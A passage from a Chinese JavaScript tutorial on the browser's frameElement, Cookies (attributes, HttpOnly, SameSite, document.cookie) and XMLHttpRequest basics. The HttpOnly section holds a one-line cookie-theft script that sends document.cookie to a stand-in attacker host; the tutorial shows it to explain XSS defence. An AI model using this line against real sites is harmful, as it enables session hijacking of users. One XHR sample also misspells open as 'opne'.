+```js
+var f1Element = document.getElementById('f1');
+var f1Window = f1Element.contentWindow;
+
+f1Window.frameElement === f1Element // true
+window.frameElement === null // true
+```
+
+## Cookie
+Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。HTTP 协议不带有状态，有些请求需要区分状态，就通过 Cookie 附带字符串，让服务器返回不一样的回应。举例来说，用户登录以后，服务器往往会在网站上留下一个 Cookie，记录用户编号（比如id=1234），以后每次浏览器向服务器请求数据，就会带上这个字符串，服务器从而知道是谁在请求，应该回应什么内容。
+
+Cookie 的目的就是区分用户，以及放置状态信息，它的使用场景主要如下。
+- 对话（session）管理：保存登录状态、购物车等需要记录的信息。
+- 个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。
+- 追踪用户：记录和分析用户行为。
+
+Cookie 不是一种理想的客户端存储机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端存储建议使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。
+
+每个 Cookie 都有以下几方面的元数据。
+- Cookie 的名字
+- Cookie 的值（真正的数据写在这里面）
+- 到期时间（超过这个时间会失效）
+- 所属域名（默认为当前域名）
+- 生效的路径（默认为当前网址）
+
+window.navigator.cookieEnabled属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。document.cookie属性返回当前网页的 Cookie。
+```js
+window.navigator.cookieEnabled // true
+document.cookie // "id=foo;key=bar"
+```
+不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。
+
+Cookie 是按照域名区分的，一般情况下，一级域名也不能读取二级域名留下的 Cookie，比如mydomain.com不能读取subdomain.mydomain.com设置的 Cookie。但是有一个例外，设置 Cookie 的时候（不管是一级域名设置的，还是二级域名设置的），明确将domain属性设为一级域名，则这个域名下面的各级域名可以共享这个 Cookie。
+
+区分 Cookie 时不考虑协议和端口。也就是说，http://example.com设置的 Cookie，可以被https://example.com或http://example.com:8080读取。
+
+### Cookie与Http协议
+Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。
+#### HTTP 回应：Cookie 的生成
+服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个Set-Cookie字段。
+```js
+Set-Cookie:foo=bar
+```
+HTTP 回应可以包含多个Set-Cookie字段，即在浏览器生成多个 Cookie。下面是一个例子。
+```js
+HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]
+```
+除了 Cookie 的值，Set-Cookie字段还可以附加 Cookie 的属性。一个Set-Cookie字段里面，可以同时包括多个属性，没有次序的要求。
+```js
+Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
+Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
+Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
+Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
+Set-Cookie: <cookie-name>=<cookie-value>; Secure
+Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
+
+Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
+// 真实例子
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+```
+
+如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的key、domain、path和secure都匹配。举例来说，如果原始的 Cookie 是用如下的Set-Cookie设置的。
+```js
+Set-Cookie: key1=value1; domain=example.com; path=/blog
+```
+改变上面这个 Cookie 的值，就必须使用同样的Set-Cookie。
+```js
+Set-Cookie: key1=value2; domain=example.com; path=/blog
+```
+只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。对于同名的Cookie，匹配越精确的 Cookie 排在越前面。
+
+#### HTTP 请求：Cookie 的发送
+浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的Cookie字段。
+```js
+Cookie: foo=bar
+```
+上面代码会向服务器发送名为foo的 Cookie，值为bar。Cookie字段可以包含多个 Cookie，使用分号（;）分隔。
+```js
+Cookie: name=value; name2=value2; name3=value3
+```
+服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。
+- Cookie 的各种属性，比如何时过期。
+- 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。
+
+### Cookie的属性
+#### Expires和Max-Age
+Expires属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用Date.prototype.toUTCString()进行格式转换。
+
+如果不设置该属性，或者设为null，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。
+
+Max-Age属性指定从现在开始 Cookie 存在的秒数，比如60 * 60 * 24 * 365（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。
+
+如果同时指定了Expires和Max-Age，那么Max-Age的值将优先生效。
+
+如果Set-Cookie字段没有指定Expires或Max-Age属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。
+
+#### Domain和Path
+Domain属性指定 Cookie 属于哪个域名，以后浏览器向服务器发送 HTTP 请求时，通过这个属性判断是否要附带某个 Cookie。
+
+服务器设定 Cookie 时，如果没有指定 Domain 属性，浏览器会默认将其设为浏览器的当前域名。如果当前域名是一个 IP 地址，则不得设置 Domain 属性。
+
+如果指定 Domain 属性，需要遵守下面规则：Domain 属性只能是当前域名或者当前域名的上级域名，但设为上级域名时，不能设为顶级域名或公共域名。（顶级域名指的是 .com、.net 这样的域名，公共域名指的是开放给外部用户设置子域名的域名，比如 github.io。）如果不符合上面这条规则，浏览器会拒绝设置这个 Cookie。
+
+举例来说，当前域名为x.y.z.com，那么 Domain 属性可以设为x.y.z.com，或者y.z.com，或者z.com，但不能设为foo.x.y.z.com，或者another.domain.com。另一个例子是，当前域名为wangdoc.github.io，则 Domain 属性只能设为wangdoc.github.io，不能设为github.io，因为后者是一个公共域名。
+
+浏览器发送 Cookie 时，Domain 属性必须与当前域名一致，或者是当前域名的上级域名（公共域名除外）。比如，Domain 属性是y.z.com，那么适用于y.z.com、x.y.z.com、foo.x.y.z.com等域名。再比如，Domain 属性是公共域名github.io，那么只适用于github.io这个域名本身，不适用于它的子域名wangdoc.github.io。
+
+Path属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，Path属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，Path属性是/，那么请求/docs路径也会包含该 Cookie。当然，前提是 Domain 属性必须符合条件。
+
+#### Secure和HttpOnly
+Secure属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的Secure属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。
+
+HttpOnly属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是document.cookie属性、XMLHttpRequest对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。
+```js
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+```
+上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的HttpOnly属性，上面代码就不会读到该 Cookie。防止XSS攻击的一个方法，就是将敏感的 Cookie 设置为HttpOnly属性。
+
+#### SameSite
+Chrome 51 开始，浏览器的 Cookie 新增加了一个SameSite属性，用来防止 CSRF 攻击和用户追踪。
+
+Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站your-bank.com，银行服务器发来了一个 Cookie。用户后来又访问了恶意网站malicious.com，上面有一个表单。用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，官网的表单一般都带有一个随机 token，官网服务器通过验证这个随机 token，确认是否为真实请求。
+
+这种第三方网站引导而附带发送的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。
+
+Cookie 的SameSite属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。
+- Strict：最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。
+- Lax：规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。
+- None：Chrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。
+
+### document.cookie
+document.cookie属性用于读写当前网页的 Cookie。读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有HTTPOnly属性。从document.cookie读出的Cookie用分号分隔，必须手动还原。
+
+document.cookie属性是可写的，可以通过它为当前网站添加 Cookie。写入的时候，Cookie 的值必须写成key=value的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用encodeURIComponent方法达到。document.cookie一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。
+
+document.cookie读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，Cookie字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，Set-Cookie字段是一行设置一个 Cookie。
+
+写入 Cookie 的时候，可以一起写入 Cookie 的属性。各个属性的写入注意点如下。
+- path属性必须为绝对路径，默认为当前路径。
+- domain属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是example.com，就不能将其设为foo.com。该属性默认为当前的一级域名（不含二级域名）。如果显式设置该属性，则该域名的任意子域名也可以读取 Cookie。
+- max-age属性的值为秒数。
+- expires属性的值为 UTC 格式，可以使用Date.prototype.toUTCString()进行日期格式转换。
+
+
+Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。
+
+删除一个现存 Cookie 的唯一方法，是设置它的expires属性为一个过去的日期。
+
+## XMLHttpRequest对象
+浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。AJAX 这个词第一次正式提出，它是 Asynchronous JavaScript and XML 的缩写，指的是通过 JavaScript 的异步通信，从服务器获取 XML 文档从中提取数据，再更新当前网页的对应部分，而不用刷新整个网页。后来，AJAX 这个词就成为 JavaScript 脚本发起 HTTP 通信的代名词，也就是说，只要用脚本发起通信，就可以叫做 AJAX 通信。
+
+具体来说，AJAX 包括以下几个步骤。
+- 创建 XMLHttpRequest 实例
+- 发出 HTTP 请求
+- 接收服务器传回的数据
+- 更新网页数据
+
+XMLHttpRequest对象是 AJAX 的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有XML和Http，它实际上可以使用多种协议（比如file或ftp），发送任何格式的数据（包括字符串和二进制）。
+
+XMLHttpRequest本身是一个构造函数，可以使用new命令生成实例。它没有任何参数。
+```js
+var xhr = new XMLHttpRequest();
+```
+一旦新建实例，就可以使用open()方法指定建立 HTTP 连接的一些细节。
+```js
+xhr.open('GET', 'http://example.com/file.json', true);
+```
+上面代码指定使用 GET 方法，跟指定的服务器网址建立连接。第三个参数true，表示请求是异步的。
+
+然后，指定回调函数，监听通信状态（readyState属性）的变化。一旦XMLHttpRequest实例的状态发生变化，就会调用监听函数，这里是handleStateChange。
+```js
+xhr.onreadystatechange = handleStateChange;
+
+function handleStateChange() {
+    // ...
+}
+```
+最后使用send()方法，实际发出请求。send()的参数为null，表示发送请求的时候，不带有数据体。如果发送的是 POST 请求，这里就需要指定数据体。
+```js
+xhr.send(null)
+```
+一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新网页里面的相关部分，从而不打断用户正在做的事情。AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨域请求，就会报错。
+
+下面是XMLHttpRequest对象间断用法的完整例子
+```js
+var xhr = new XMLHttpRequest()
+
+xhr.onreadystatechange = function() {
+    // 通信成功，状态值为4
+    if (xhr.readyState === 4) {
+        if (xhr.status === 200) {
+            console.log(xhr.responseText)
+        } else {
+            console.error(xhr.statusText)
+        }
+    }
+}
+
+xhr.onerror = function(e) {
+    console.error(xhr.statusText)
+}
+
+xhr.opne('GET', 'http://example.com/file.json', true)
+xhr.send(null)
+```
+
+### XMLHttpRequest的实例属性
+#### XMLHttpRequest.readyState 
+XMLHttpRequest.readyState返回一个整数，表示实例对象的当前状态。该属性只读。它可能返回以下值。
+- 0，表示 XMLHttpRequest 实例已经生成，但是实例的open()方法还没有被调用。
+- 1，表示open()方法已经调用，但是实例的send()方法还没有调用，仍然可以使用实例的setRequestHeader()方法，设定 HTTP 请求的头信息。
+- 2，表示实例的send()方法已经调用，并且服务器返回的头信息和状态码已经收到。
+- 3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的responseType属性等于text或者空字符串，responseText属性就会包含已经收到的部分信息。
+- 4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。
+
+通信过程中，每当实例对象发生状态变化，它的readyState属性的值就会改变。这个值每一次变化，都会触发readyStateChange事件。
+```js
+var xhr = new XMLHttpRequest()
+
+if (xhr.readyState === 4) {
+    // 请求结束，处理服务器返回的数据
+} else {
+  // 显示提示“加载中……”
+}
+```
+
+#### XMLHttpRequest.onreadystatechange
+XMLHttpRequest.onreadystatechange属性指向一个监听函数。readystatechange事件发生时（实例的readyState属性变化），就会执行这个属性。
+
+如果使用实例的abort()方法，终止 XMLHttpRequest 请求，也会造成readyState属性变化，导致调用XMLHttpRequest.onreadystatechange属性。
+```js
+var xhr = new XMLHttpRequest()
+
+
+xhr.open('GET', 'http://example.com/file.json', true)
+xhr.onreadystatechange = function() {
+    if (xhr.readyState !== 4 || xhr.status !== 200) {
+        return 
+    }
+    console.log(xhr.responseText)
+}
+
+xhr.send(null)
+```
